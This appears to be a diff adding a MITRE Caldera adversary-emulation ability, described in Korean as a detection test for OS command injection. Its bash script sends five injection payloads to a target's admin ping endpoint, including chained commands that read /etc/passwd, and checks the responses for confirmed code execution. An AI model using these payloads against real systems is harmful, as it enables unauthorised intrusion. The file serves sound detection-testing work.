@@ -1,0 +1,57 @@
+- id: f1a2b3c4-d5e6-f7a8-b9c0-d1e2f3a4b5c6
+  name: Command Injection - Basic OS Command Injection
+  description: 관리자 ping 진단 기능의 host 파라미터에 쉘 메타문자를 삽입하여 OS 명령어를 실행합니다. 세미콜론(;), 파이프(|), AND(&&) 등 기본적인 명령 체이닝 기법을 테스트합니다. OWASP A03:2021 Injection / CWE-78 대응 탐지 테스트입니다.
+  tactic: execution
+  technique:
+    attack_id: T1059.004
+    name: 'Command and Scripting Interpreter: Unix Shell'
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1059.004"
+          ABILITY_ID="f1a2b3c4-d5e6-f7a8-b9c0-d1e2f3a4b5c6"
+          TARGET="http://#{target.url}"
+
+          CMDI_PAYLOADS=(
+            # 1. Semicolon chaining: ; id
+            "127.0.0.1%3B+id"
+            # 2. Pipe: | cat /etc/passwd
+            "127.0.0.1+%7C+cat+%2Fetc%2Fpasswd"
+            # 3. AND chaining: && whoami
+            "127.0.0.1+%26%26+whoami"
+            # 4. Backtick substitution: `id`
+            "127.0.0.1+%60id%60"
+            # 5. $() substitution: $(cat /etc/hostname)
+            "127.0.0.1+%24%28cat+%2Fetc%2Fhostname%29"
+          )
+
+          LABELS=(
+            "Semicolon chain: ; id"
+            "Pipe: | cat /etc/passwd"
+            "AND chain: && whoami"
+            "Backtick: \`id\`"
+            "Dollar-paren: \$(cat /etc/hostname)"
+          )
+
+          for i in "${!CMDI_PAYLOADS[@]}"; do
+            echo "[*] CMDi Attempt $((i+1)): ${LABELS[$i]}"
+            RESULT=$(curl -s \
+              -H "X-Caldera-Op-Id: ${OP_ID}" \
+              -H "X-Caldera-Technique: ${TECH_ID}" \
+              -H "X-Caldera-Ability: ${ABILITY_ID}" \
+              -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+              "${TARGET}/api/admin/ping?host=${CMDI_PAYLOADS[$i]}")
+            echo "[+] Response:"
+            echo "${RESULT}" | head -10
+            echo ""
+
+            # uid= 패턴이 응답에 포함되면 RCE 성공
+            if echo "${RESULT}" | grep -qE 'uid=[0-9]+'; then
+              echo "[!] RCE CONFIRMED — uid= pattern detected"
+            fi
+          done
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: host.vuln.rce
